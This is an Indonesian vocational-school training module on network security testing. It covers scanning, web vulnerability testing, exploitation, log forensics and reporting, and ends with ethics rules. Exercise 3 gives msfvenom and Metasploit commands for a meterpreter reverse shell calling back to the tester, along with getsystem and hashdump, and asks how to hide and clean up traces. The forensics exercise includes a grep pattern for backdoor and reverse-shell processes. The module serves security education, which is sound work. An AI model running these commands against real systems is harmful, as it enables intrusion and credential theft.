# 🏋️ Latihan Terstruktur: Pengujian Keamanan Jaringan

## 🎯 Tujuan Pembelajaran
Melalui serangkaian latihan ini, peserta didik akan mengembangkan kemampuan:
1. Melakukan pengujian keamanan jaringan secara sistematis
2. Menganalisis hasil pemindaian keamanan
3. Mengidentifikasi dan memanfaatkan kerentanan
4. Mendokumentasikan temuan keamanan
5. Memberikan rekomendasi perbaikan

## 🔍 Latihan 1: Pemetaan Jaringan

### Tujuan
Memetakan infrastruktur jaringan target dan mengidentifikasi komponen aktif

### Langkah Kerja
1. Gunakan Nmap untuk melakukan discovery host:
   ```bash
   nmap -sn 192.168.1.0/24 -oN host_discovery.txt
   ```

2. Identifikasi sistem operasi dan layanan yang berjalan:
   ```bash
   nmap -O -sV -T4 [TARGET_IP] -oN service_scan.txt
   ```

3. Visualisasi hasil scan dengan Nmap:
   ```bash
   nmap -sP 192.168.1.0/24 -oX scan.xml
   xsltproc scan.xml -o scan.html
   ```

### Pertanyaan
1. Berapa jumlah host yang aktif dalam jaringan target?
2. Layanan apa saja yang teridentifikasi?
3. Bagaimana cara mengidentifikasi versi layanan yang rentan?

## 🛡️ Latihan 2: Analisis Kerentanan Web

### Tujuan
Mengidentifikasi dan mengeksploitasi kerentanan pada aplikasi web

### Langkah Kerja
1. Gunakan OWASP ZAP untuk memindai target web:
   ```bash
   zap-cli quick-scan -s all http://[TARGET_IP] -l Medium
   ```

2. Analisis form login untuk kerentanan SQL Injection:
   ```bash
   sqlmap -u "http://[TARGET_IP]/login.php" --forms --batch
   ```

3. Uji kerentanan XSS pada form pencarian:
   ```bash
   python3 xsstrike.py -u "http://[TARGET_IP]/search?q="
   ```

### Pertanyaan
1. Kerentanan apa saja yang ditemukan?
2. Bagaimana cara memvalidasi temuan kerentanan?
3. Apa rekomendasi perbaikan untuk setiap kerentanan?

## ⚔️ Latihan 3: Eksploitasi dan Post-Exploitation

### Tujuan
Memanfaatkan kerentanan dan mempertahankan akses

### Langkah Kerja
1. Gunakan Metasploit untuk eksploitasi:
   ```bash
   msfconsole
   use exploit/multi/handler
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST [YOUR_IP]
   set LPORT 4444
   exploit
   ```

2. Buat payload dengan msfvenom:
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=[YOUR_IP] LPORT=4444 -f exe > shell.exe
   ```

3. Lakukan privilege escalation:
   ```bash
   getsystem
   hashdump
   ```

### Pertanyaan
1. Bagaimana cara meminimalkan jejak saat melakukan eksploitasi?
2. Apa yang harus dilakukan setelah mendapatkan akses awal?
3. Bagaimana cara membersihkan jejak setelah selesai?

## 📊 Latihan 4: Analisis Log dan Forensik

### Tujuan
Menganalisis log untuk mengidentifikasi aktivitas mencurigakan

### Langkah Kerja
1. Analisis log akses web:
   ```bash
   cat /var/log/apache2/access.log | grep -i "select.*from"
   ```

2. Identifikasi koneksi jaringan mencurigakan:
   ```bash
   netstat -tulnp | grep ESTABLISHED
   ```

3. Periksa proses yang berjalan:
   ```bash
   ps aux | grep -i "backdoor\|shell\|reverse"
   ```

### Pertanyaan
1. Indikator kompromi apa yang teridentifikasi?
2. Bagaimana cara melacak asal serangan?
3. Langkah apa yang harus diambil untuk memitigasi serangan?

## 📝 Latihan 5: Penyusunan Laporan Keamanan

### Tujuan
Membuat laporan keamanan yang komprehensif

### Langkah Kerja
1. Gunakan template laporan:
   ```markdown
   # LAPORAN PENGUJIAN KEAMANAN
   
   ## 1. Ringkasan Eksekutif
   - [Ringkasan temuan]
   
   ## 2. Temuan Utama
   ### 2.1 [Nama Kerentanan]
   - **Tingkat Keparahan**: 
   - **Dampak**: 
   - **Rekomendasi**:
   
   ## 3. Lampiran
   - [Screenshot/Log]
   ```

2. Sertakan bukti temuan
3. Berikan rekomendasi perbaikan

### Pertanyaan
1. Bagaimana menyampaikan temuan teknis ke pemangku kepentingan non-teknis?
2. Bagaimana menentukan prioritas perbaikan?
3. Apa yang harus disertakan dalam laporan untuk memenuhi standar industri?

## 🧩 Tantangan Lanjutan

### Tantangan 1: Red Team vs Blue Team
- Bentuk dua tim
- Tim Merah bertugas melakukan penetrasi
- Tim Biru bertugas mempertahankan sistem
- Durasi: 60 menit
- Dokumentasikan setiap langkah

### Tantangan 2: CTF (Capture The Flag)
- Selesaikan serangkaian tantangan keamanan
- Dapatkan flag tersembunyi
- Kategori: Web, Crypto, Forensik, dll.
- Waktu: 120 menit

## 📚 Sumber Belajar
1. [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
2. [Hack The Box Academy](https://academy.hackthebox.com/)
3. [TryHackMe](https://tryhackme.com/)
4. [PortSwigger Web Security Academy](https://portswigger.net/web-security)

## 📅 Jadwal Latihan
| Minggu | Topik | Durasi |
|--------|-------|--------|
| 1 | Pemetaan Jaringan | 4 JP |
| 2 | Pengujian Aplikasi Web | 6 JP |
| 3 | Eksploitasi | 6 JP |
| 4 | Analisis Forensik | 4 JP |
| 5 | Pelaporan | 2 JP |
| 6 | Ujian Praktik | 4 JP |

## ⚠️ Etika dan Legalitas
1. Hanya lakukan pengujian pada sistem yang diizinkan
2. Dapatkan persetujuan tertulis sebelum pengujian
3. Patuhi hukum yang berlaku
4. Jaga kerahasiaan temuan

---
<div align="center">
  <p>Modul Latihan - Pengujian Keamanan Jaringan</p>
  <p>© 2025 SMKN 1 Punggelan - Program Keahlian Teknik Komputer dan Jaringan</p>
</div>
